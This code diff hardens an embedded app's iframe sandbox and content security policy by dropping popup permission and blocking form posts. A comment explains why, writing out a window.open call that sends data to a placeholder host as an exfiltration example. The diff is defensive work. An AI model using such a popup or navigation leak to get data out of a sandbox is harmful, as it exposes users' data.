@@ -184,12 +184,29 @@ export const WRITE_METHODS: ReadonlySet<FsMethod> = new Set<FsMethod>([
     "remove",
 ])
 
-/** `sandbox` attribute of the app iframe. No `allow-same-origin`: the app is a foreign origin. */
-export const SANDBOX_FLAGS = "allow-scripts allow-forms allow-popups"
+/**
+ * `sandbox` attribute of the app iframe. No `allow-same-origin`: the app is a foreign origin.
+ *
+ * No `allow-popups` either, and that one is load-bearing. CSP fetch directives do not govern
+ * NAVIGATION, and `navigate-to` never shipped in browsers — so with popups allowed, an app can
+ * call `window.open("https://…?d=" + data)` inside any click it already receives, and close the
+ * window straight after. Verified against these exact flags: the request leaves and the data
+ * arrives. `default-src 'none'` stops fetch, XHR, WebSocket and image beacons; it does nothing
+ * about a popup. Dropping the flag is what actually closes the app's last way out.
+ *
+ * An app that wants to link somewhere external still can: the click arrives at the host as a
+ * `nav` message and the host decides, which also means the person sees where they are going.
+ */
+export const SANDBOX_FLAGS = "allow-scripts allow-forms"
 
-/** CSP injected into the app document. Inline only; no network, no remote fonts or images. */
+/**
+ * CSP injected into the app document. Inline only; no network, no remote fonts or images.
+ *
+ * `form-action 'none'` closes the other navigation-shaped exit: a form posting to an external
+ * action. It does not inherit from `default-src`, so it has to be named.
+ */
 export const RUN_CSP =
-    "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:"
+    "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; form-action 'none'"
 
 /** Theme tokens the kit CSS consumes; the host fills them from its palette. */
 export const KIT_TOKENS = [
